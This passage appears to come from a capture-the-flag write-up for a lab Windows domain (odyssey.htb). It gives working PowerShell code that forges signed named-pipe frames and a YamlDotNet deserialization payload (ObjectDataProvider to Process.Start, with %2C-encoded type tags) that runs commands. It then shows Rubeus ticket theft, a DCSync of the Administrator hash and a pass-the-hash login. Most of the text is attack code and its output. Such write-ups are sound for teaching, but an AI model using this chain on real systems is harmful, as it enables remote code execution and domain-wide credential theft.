The `DeserializerBuilder().WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())` line is conspicuous. It is a `YAML` library feature explicitly marked `[Obsolete]` by `YamlDotNet's` own authors - but we are not touching it yet. A trivial `YAML` document with no type tags will exercise the handler without going near the type resolver.

The script follows the same structure as the oracle client. Three things change: 

The signing key. The operator key was recovered as a hex string. `PowerShell` has no one-liner for hex-to-bytes, so we loop over two-character slices:

```powershell
$opKeyHex = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$opKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) { $opKey[$i] = [Convert]::ToByte($opKeyHex.Substring($i*2, 2), 16) }
```

Then, the opcode. `CONFIG_IMPORT` instead of `DIAG_DECRYPT_TELEMETRY_BLOB`.

```powershell
$opBytes = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')
```

Finally payload. A minimal `YAML` document, `UTF-8` encoded. No type tags, no structure - just enough to prove the round-trip works.                                            

  ```powershell
  $yaml  = "test: hello"
  $payload = [Text.Encoding]::UTF8.GetBytes($yaml)
  ```

Everything else — HMAC computation over OpCode || Payload, frame assembly, pipe connection, response parsing — is mechanically identical to the oracle client, substituting `$opKey` for `$viewerKey` and `$payload` for `$wrapBlob`. The full script:

```                                                                                          powershell
# config_import.ps1
$opKeyHex = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$opKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) { $opKey[$i] = [Convert]::ToByte($opKeyHex.Substring($i*2, 2), 16) }
$yaml = "test: hello"
$payload = [Text.Encoding]::UTF8.GetBytes($yaml)
$opBytes = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')
$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$opKey)
$signData = New-Object byte[] ($opBytes.Length + $payload.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($payload, 0, $signData, $opBytes.Length, $payload.Length)
$sig = $hmac.ComputeHash($signData)
$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$payload.Length); $bw.Write($payload)
$bw.Write($sig); $bw.Flush()
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length); $pipe.Flush()
$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072); $pipe.Dispose()
$rOpLen = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
Write-Output "Status: $rOpCode | PayloadLen: $rPlLen" 
```

```shell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./config_import.ps1
Status: OK | PayloadLen: 0
```

The operator key works. The handler accepted our `YAML`, deserialized it, and stored it via `_config`. Apply, and replied OK with an empty body — exactly matching the code path we traced. We now have confirmed, authenticated `Operator`-level access to `CONFIG_IMPORT`.

Now the question becomes: what can `CONFIG_IMPORT` actually do? We confirmed it accepts `YAML` and stores the deserialized result. But the handler constructs its deserializer with a very specific line:

```csharp
IDeserializer deserializer = new DeserializerBuilder()
    .WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())
    .Build();
```

`TypeNameInTagNodeTypeResolver` is a class inside `YamlDotNet` itself. The decompiled `YamlDotNet/Serialization/NodeTypeResolvers/TypeNameInTagNodeTypeResolver.cs` is short enough to read in full:

```csharp
[Obsolete("The mechanism that this class uses to specify type names is non-standard. " +
          "Register the tags explicitly instead of using this convention.")]
public sealed class TypeNameInTagNodeTypeResolver : INodeTypeResolver
{
    bool INodeTypeResolver.Resolve(NodeEvent nodeEvent, ref Type currentType)
    {
        if (nodeEvent != null && !nodeEvent.Tag.IsEmpty)
        {
            Type type = Type.GetType(nodeEvent.Tag.Value.Substring(1), false);
            if (type != null)
            {
                currentType = type;
                return true;
            }
        }
        return false;
    }
}
```

As previously mentioned, the class is marked `[Obsolete]` by `YamlDotNet's` own authors. The reason is in the code: it takes a `YAML` tag, strips the first character with `.Substring(1)`, and passes the result directly to `Type.GetType()`. If the type resolves, it becomes the deserialization target. The target type in `HandleConfigImport` is `object` - no constraint - so whatever type the tag resolves to is what gets instantiated and populated.

This is an unsafe deserialization primitive. `Type.GetType(string, throwOnError: false)` will resolve any type in any loaded assembly. The question is which assemblies are loaded. The answer is in `AegisStreamSvc.runtimeconfig.json`:

```json
"frameworks": [
  { "name": "Microsoft.NETCore.App", "version": "8.0.0" },
  { "name": "Microsoft.WindowsDesktop.App", "version": "8.0.0" }
]
```

`Microsoft.WindowsDesktop.App` includes `PresentationFramework.dll` - the WPF assembly. This makes `System.Windows.Data.ObjectDataProvider` resolvable at runtime. `ObjectDataProvider` is a well-known `.NET` deserialization gadget: when its `MethodName` property is set, it auto-invokes that method on `ObjectInstance`. If `ObjectInstance` is a `System.Diagnostics.Process` and `MethodName` is `Start`, the result is arbitrary command execution.

The attack surface chain is:

```
YAML tag  → TypeNameInTagNodeTypeResolver.Resolve()
         → Type.GetType(tag.Substring(1))
         → ObjectDataProvider (from PresentationFramework)
         → auto-invoke MethodName on ObjectInstance
         → Process.Start(ProcessStartInfo)
         → RCE as svc-aegis-stream
```

This is a known pattern. `YamlDotNet's` own deprecation notice on the class says to "register the tags explicitly instead of using this convention" — the `AegisStream` developer ignored that advice.

The remaining question is the tag format. `.Substring(1)` strips one character — the leading `!` in a `YAML` local tag. For `Type.GetType()` to resolve a type from an external assembly, it needs an assembly-qualified name: `Namespace.Type, AssemblyName`. That string contains a comma. And commas in `YAML` tags are problematic.

At this point, we have to make a disclaimer. A player working through this step would typically go through several rounds of trial and error with tag formats — trying global tags (`!!`), verbatim tags (`!<>`), literal commas, and various escaping strategies — before arriving at the working format. Each failure produces a different error response (`YamlException`, `HANDLER_ERROR`, `OK` with null type resolution), creating a feedback loop. For the sake of this writeup's length, we'll go directly to the resolution path through the decompiled scanner code.

The answer is in `YamlDotNet/Core/Scanner.cs`, in the `ScanTagUri` method. This is the function that parses the body of a `YAML` tag:

```csharp
private string ScanTagUri(string head, Mark start)
{
    // ...
    StringBuilder builder = builderWrapper.Builder;
    if (head != null && head.Length > 1)
    {
        builder.Append(head.Substring(1));
    }
    while (this.analyzer.IsAlphaNumericDashOrUnderscore(0)
        || this.analyzer.Check(";/?:@&=+$.!~*'()[]%", 0)
        || (this.analyzer.Check(',', 0) && !this.analyzer.IsBreak(1)))
    {
        if (this.analyzer.Check('%', 0))
        {
            builder.Append(this.ScanUriEscapes(start));
        }
        else if (this.analyzer.Check('+', 0))
        {
            builder.Append(' ');
            this.Skip();
        }
        else
        {
            builder.Append(this.ReadCurrentCharacter());
        }
    }
    // ...
    string text = builder.ToString();
    if (text.EndsWith(","))
    {
        throw new SyntaxErrorException(... "Unexpected comma at end of tag");
    }
    return text;
}
```

The `%` branch calls `ScanUriEscapes`, which decodes URI percent-encoding: `%2C` → hex `0x2C` → ASCII 44 → `,`. The decoded comma is appended to the builder as a regular character — it never hits the `YAML` grammar's tag-termination logic because the scanner already consumed the three raw characters (`%`, `2`, `C`) and produced a single decoded character.

So the tag format is:

```
!System.Windows.Data.ObjectDataProvider%2CPresentationFramework
```

The scanner reads this as:

- `!` → local tag prefix (stripped by `.Substring(1)`)
- `System.Windows.Data.ObjectDataProvider` → alphanumeric + dots, appended directly
- `%2C` → hits `analyzer.Check('%')` → `ScanUriEscapes` decodes to `,`
- `PresentationFramework` → alphanumeric, appended directly

Final `Tag.Value`: `!System.Windows.Data.ObjectDataProvider,PresentationFramework` After `.Substring(1)`: `System.Windows.Data.ObjectDataProvider,PresentationFramework`

That is exactly the assembly-qualified name that `Type.GetType()` needs. With this, we can construct a `YAML` payload that chains `ObjectDataProvider` → `Process.Start`. Three types need `%2C`-encoded tags:

```yaml
--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework
ObjectInstance:
  !System.Diagnostics.Process%2CSystem.Diagnostics.Process
  StartInfo:
    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process
    FileName: cmd.exe
    Arguments: '/c whoami > C:\ProgramData\AegisStream\logs\rce.txt'
MethodName: Start
```

`ObjectDataProvider` is the outer node — when `YamlDotNet` sets its `MethodName` property to `Start`, it auto-invokes `Start()` on `ObjectInstance`. `ObjectInstance` is a `Process` whose `StartInfo` points at `cmd.exe` with our command. The output path is inside `C:\ProgramData\AegisStream\logs\`, which `svc-aegis-stream` has write access to.

In `config_import.ps1`, two things change. The `YAML` payload, which is now the `ObjectDataProvider` chain instead of `test: hello`:

```powershell
$nl = [char]10
$yaml = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $nl +
    "ObjectInstance:" + $nl +
    "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $nl +
    "  StartInfo:" + $nl +
    "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $nl +
    "    FileName: cmd.exe" + $nl +
    "    Arguments: '/c whoami > C:\ProgramData\AegisStream\logs\rce.txt'" + $nl +
    "MethodName: Start"
$payload = [Text.Encoding]::UTF8.GetBytes($yaml)
```

And the output line, which now also prints the response payload in case the handler returns an error body:

```powershell
Write-Output "Status: $rOpCode | PayloadLen: $rPlLen"
if ($rPlLen -gt 0) {
    $rPayload = New-Object byte[] $rPlLen
    [Array]::Copy($buf, 14 + $rOpLen, $rPayload, 0, $rPlLen)
    Write-Output ([Text.Encoding]::UTF8.GetString($rPayload))
}
```

Everything else — operator key loading, HMAC computation, frame assembly, pipe connection, response parsing — is identical to the test run.

```powershell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> type C:\ProgramData\AegisStream\logs\rce.txt
odyssey\svc-aegis-stream
```

We have now confirmed code execution as `svc-aegis-stream`. To be able to perform `DCSync`, we need to grab hold of an authentication package for the account. We will achieve that by generating a `TGT` through `Rubeus`. 

We will first need to copy `Rubeus` to a location where `svc-aegis-stream` has access to - `C:\ProgramData\AegisStream`. Then, we will execute `Rubeus` and grab the output in `C:\ProgramData\AegisStream\logs` just like we did with the test payload.

First, upload `Rubeus` through `WinRM`, and grant everyone read and execute access:

```shell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> upload Rubeus.exe
Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> cmd /c "icacls C:\Users\svc-aegis-deploy\Documents\Rubeus.exe /grant Everyone:RX"
processed file: C:\Users\svc-aegis-deploy\Documents\Rubeus.exe
Successfully processed 1 files; Failed processing 0 files

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> cmd /c "icacls C:\Users\svc-aegis-deploy\Documents /grant Everyone:RX"
processed file: C:\Users\svc-aegis-deploy\Documents
Successfully processed 1 files; Failed processing 0 files

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> cmd /c "icacls C:\Users\svc-aegis-deploy /grant Everyone:RX"
processed file: C:\Users\svc-aegis-deploy
Successfully processed 1 files; Failed processing 0 files
```

Then, we copy `Rubeus` to `C:\ProgramData\AegisStream` folder as `svc-aegis-stream`.

```shell
# config_import.ps1
$yaml = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $nl +
    "ObjectInstance:" + $nl +
    "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $nl +
    "  StartInfo:" + $nl +
    "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $nl +
    "    FileName: cmd.exe" + $nl +
    "    Arguments: '/c copy C:\Users\svc-aegis-deploy\Documents\Rubeus.exe C:\ProgramData\AegisStream\Rubeus.exe'" + $nl +
    "MethodName: Start"
```

```shell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./config_import.ps1
Status: OK | PayloadLen: 0

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> dir C:\ProgramData\AegisStream

    Directory: C:\ProgramData\AegisStream
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2026  12:55 PM                config
d-----          5/8/2026  12:54 PM                dpapi
d-----          5/8/2026  12:54 PM                keys
d-----          5/8/2026  12:51 PM                logs
d-----          5/8/2026  12:57 PM                telemetry
-a----         5/14/2026  12:30 PM         446976 Rubeus.exe
```

Finally, run `Rubeus` and grab the output:

```shell
# config_import.ps1
$yaml = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $nl +
    "ObjectInstance:" + $nl +
    "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $nl +
    "  StartInfo:" + $nl +
    "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $nl +
    "    FileName: cmd.exe" + $nl +
    "    Arguments: '/c C:\ProgramData\AegisStream\Rubeus.exe tgtdeleg /nowrap > C:\ProgramData\AegisStream\logs\rubeus_out.txt 2>&1'" + $nl +
    "MethodName: Start"
```

```shell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./config_import.ps1
Status: OK | PayloadLen: 0

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> type C:\ProgramData\AegisStream\logs\rubeus_out.txt
<SNIP>
[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.odyssey.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: cYO4jAC+t1PsGDOSfVIblC+SQgjGEIHZgmLeVlOgaCI=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):
    doIGDDCCBgigAwIBBaEDAgEWooI<SNIP>ADAgECoRcwFRsGa3JidGd0GwtPRFlTU0VZLkhUQg==
```

## DCsync and access as DA

Now we will follow the classic `DCsync` pattern. We will first convert the `base64` encoded `kirbi` file to a `.ccache`. Then we will use `impacket-secretsdump` with the ticket, grab the `Administrator's` hash, and access the DC through `WinRM` with the `Administrator` user.

```shell
$ echo 'doIGDDCCBgigAwIBBaEDAgEWooI<SNIP>ADAgECoRcwFRsGa3JidGd0GwtPRFlTU0VZLkhUQg==' | base64 -d > svc-aegis-stream.kirbi

$ impacket-ticketConverter svc-aegis-stream.kirbi svc-aegis-stream.ccache
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
[*] converting kirbi to ccache...
[+] done

$ KRB5CCNAME=svc-aegis-stream.ccache impacket-secretsdump -k -no-pass -dc-ip 172.16.0.10 "odyssey.htb/svc-aegis-stream@dc01.odyssey.htb" -just-dc-user Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:890b9e96245f6895e06adfe92ad1e81f:::

$ evil-winrm -i 172.16.0.10 -u Administrator -H "890b9e96245f6895e06adfe92ad1e81f"                           
Evil-WinRM shell v3.7                               
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

We can now grab the `root` flag located in `C:\Users\Administrator\Desktop\root.txt`

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
<REDACTED>
```
